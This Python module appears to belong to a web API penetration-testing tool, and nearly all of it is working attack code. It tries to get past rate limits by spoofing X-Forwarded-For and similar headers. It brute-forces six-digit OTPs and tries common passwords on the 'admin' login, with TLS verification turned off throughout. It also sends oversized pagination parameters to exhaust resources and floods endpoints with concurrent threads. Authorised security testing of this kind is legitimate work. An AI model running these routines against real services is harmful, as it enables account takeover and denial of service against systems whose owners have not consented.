"""
Rate Limiting & DoS Module
- Rate limit bypass
- OTP/password brute force
- Resource exhaustion
"""

import requests
import time
from typing import Dict, Any
import logging

logger = logging.getLogger(__name__)

class RateLimitingDoSAnalyzer:
    """Analyze rate limiting and DoS vulnerabilities"""
    
    def __init__(self, base_url: str, token: str = None):
        self.base_url = base_url.rstrip('/')
        self.token = token
        self.headers = {'Authorization': f'Bearer {token}'} if token else {}
        
    def test_rate_limit_bypass_headers(self, endpoint: str) -> Dict[str, Any]:
        """Test rate limit bypass via headers"""
        logger.info(f"[*] Testing rate limit bypass headers on {endpoint}...")
        
        bypass_headers = [
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Original-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'CF-Connecting-IP': '127.0.0.1'},
            {'Client-IP': '127.0.0.1'}
        ]
        
        successful_bypasses = []
        
        for header_dict in bypass_headers:
            try:
                headers = self.headers.copy()
                headers.update(header_dict)
                
                for i in range(10):
                    resp = requests.get(
                        f"{self.base_url}{endpoint}",
                        headers=headers,
                        timeout=5,
                        verify=False
                    )
                    
                    if resp.status_code != 429:  # Not rate limited
                        successful_bypasses.append(list(header_dict.keys())[0])
                        logger.info(f"[+] Rate limit bypassed with: {list(header_dict.keys())}")
                        break
            except:
                pass
        
        return {
            'vulnerable': len(successful_bypasses) > 0,
            'bypass_headers': successful_bypasses
        }
    
    def test_otp_brute_force(self, endpoint: str) -> Dict[str, Any]:
        """Test OTP brute force without rate limits"""
        logger.info(f"[*] Testing OTP brute force on {endpoint}...")
        
        start_time = time.time()
        successful_codes = []
        
        # Test small range
        for otp in range(0, 100):
            try:
                payload = {'otp': str(otp).zfill(6)}
                resp = requests.post(
                    f"{self.base_url}{endpoint}",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if resp.status_code == 200 or 'success' in resp.text.lower():
                    successful_codes.append(otp)
                    logger.info(f"[+] Valid OTP found: {otp}")
                    
                # Check if rate limited
                if resp.status_code == 429:
                    logger.info(f"[-] Rate limited after {otp} attempts")
                    return {'vulnerable': False, 'rate_limited_at': otp}
            except:
                pass
        
        elapsed = time.time() - start_time
        
        return {
            'vulnerable': len(successful_codes) > 0,
            'valid_codes': successful_codes,
            'attempts_before_limit': 100,
            'time_elapsed': elapsed
        }
    
    def test_password_brute_force(self) -> Dict[str, Any]:
        """Test password brute force without rate limits"""
        logger.info("[*] Testing password brute force...")
        
        common_passwords = [
            'admin', 'password', '123456', 'admin123',
            'test', 'user', 'letmein', 'welcome'
        ]
        
        successful_logins = []
        
        for pwd in common_passwords:
            try:
                payload = {'username': 'admin', 'password': pwd}
                resp = requests.post(
                    f"{self.base_url}/api/login",
                    json=payload,
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                
                if 'token' in resp.text or resp.status_code == 200:
                    successful_logins.append({'username': 'admin', 'password': pwd})
                    logger.info(f"[+] Valid credentials found: admin / {pwd}")
                
                if resp.status_code == 429:
                    return {'vulnerable': False, 'rate_limited': True}
            except:
                pass
        
        return {
            'vulnerable': len(successful_logins) > 0,
            'valid_credentials': successful_logins
        }
    
    def test_api_resource_exhaustion(self, endpoint: str) -> Dict[str, Any]:
        """Test API resource exhaustion"""
        logger.info(f"[*] Testing resource exhaustion on {endpoint}...")
        
        payloads = [
            {'limit': 999999},
            {'page': 999999},
            {'page': 1, 'per_page': 100000},
            {'items': 50000},
            {'recursion_depth': 1000}
        ]
        
        for payload in payloads:
            try:
                resp = requests.get(
                    f"{self.base_url}{endpoint}",
                    params=payload,
                    headers=self.headers,
                    timeout=10,
                    verify=False
                )
                
                if resp.status_code == 200:
                    logger.info(f"[+] Resource exhaustion possible: {payload}")
                    return {
                        'vulnerable': True,
                        'technique': 'Resource Exhaustion',
                        'payload': payload
                    }
            except:
                pass
        
        return {'vulnerable': False}
    
    def test_concurrent_requests(self, endpoint: str, concurrent_count: int = 50) -> Dict[str, Any]:
        """Test API under concurrent requests"""
        logger.info(f"[*] Testing concurrent requests ({concurrent_count}) on {endpoint}...")
        
        import threading
        responses = []
        errors = []
        
        def make_request():
            try:
                resp = requests.get(
                    f"{self.base_url}{endpoint}",
                    headers=self.headers,
                    timeout=5,
                    verify=False
                )
                responses.append(resp.status_code)
            except Exception as e:
                errors.append(str(e))
        
        threads = []
        start_time = time.time()
        
        for i in range(concurrent_count):
            t = threading.Thread(target=make_request)
            threads.append(t)
            t.start()
        
        for t in threads:
            t.join()
        
        elapsed = time.time() - start_time
        
        rate_limited = sum(1 for r in responses if r == 429)
        successful = sum(1 for r in responses if r == 200)
        
        return {
            'total_requests': concurrent_count,
            'successful': successful,
            'rate_limited': rate_limited,
            'errors': len(errors),
            'time_elapsed': elapsed,
            'vulnerable': rate_limited == 0 and successful > 30
        }
    
    def analyze(self) -> Dict[str, Any]:
        """Run full rate limiting and DoS analysis"""
        logger.info("[*] Starting rate limiting and DoS analysis...")
        
        results = {
            'rate_limit_bypass': self.test_rate_limit_bypass_headers('/api/data'),
            'otp_brute_force': self.test_otp_brute_force('/api/verify_otp'),
            'password_brute_force': self.test_password_brute_force(),
            'resource_exhaustion': self.test_api_resource_exhaustion('/api/list'),
            'concurrent_requests': self.test_concurrent_requests('/api/data', 30)
        }
        
        return results
